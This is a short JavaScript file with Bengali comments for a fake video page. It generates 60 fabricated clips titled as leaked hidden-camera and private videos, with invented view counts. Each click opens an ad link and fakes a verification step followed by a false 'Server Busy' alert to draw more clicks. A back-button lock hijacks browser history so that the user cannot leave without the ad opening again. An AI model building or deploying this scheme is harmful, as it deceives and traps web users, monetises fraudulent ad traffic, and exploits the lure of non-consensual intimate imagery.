// ১. তোমার অ্যাডস্টেরা ডাইরেক্ট লিঙ্ক এখানে দাও
const AD_LINK = "YOUR_ADSTERRA_DIRECT_LINK_HERE";

// ২. ভাইরাল টাইটেল দিয়ে ৬০টি ভিডিও জেনারেট করা
const titles = ["Viral_Private_Video", "Hidden_Cam_Leaked", "Exclusive_Premium_Clip", "MMS_Trending_2026"];
function generateVideos() {
    const container = document.getElementById('video-grid-container');
    let html = '';
    for (let i = 1; i <= 60; i++) {
        const t = titles[Math.floor(Math.random() * titles.length)];
        html += `
            <div class="video-card">
                <div class="thumb" style="background-image: url('https://picsum.photos/seed/${i}/200/120')">
                    <span class="duration">${Math.floor(Math.random()*15)}:20</span>
                </div>
                <div class="card-info">
                    <h4>${t}_HD_part_${i}.mp4</h4>
                    <p>${(Math.random()*5).toFixed(1)}M Views</p>
                </div>
            </div>`;
    }
    container.innerHTML = html;
}
window.onload = generateVideos;

// ৩. অ্যাড ফাংশন
function handleGlobalClick() {
    window.open(AD_LINK, '_blank');
    document.getElementById('step-2').classList.add('active');
    document.getElementById('main-verify-btn').innerText = "VERIFYING...";
    setTimeout(() => { 
        alert("Server Busy! Please try again to verify."); 
        document.getElementById('main-verify-btn').innerText = "TRY AGAIN (CONNECT)";
    }, 3000);
}

// ৪. Back Button Lock
(function() {
    window.history.pushState(null, null, window.location.href);
    window.onpopstate = function() {
        window.open(AD_LINK, '_blank');
        window.history.pushState(null, null, window.location.href);
    };
})();
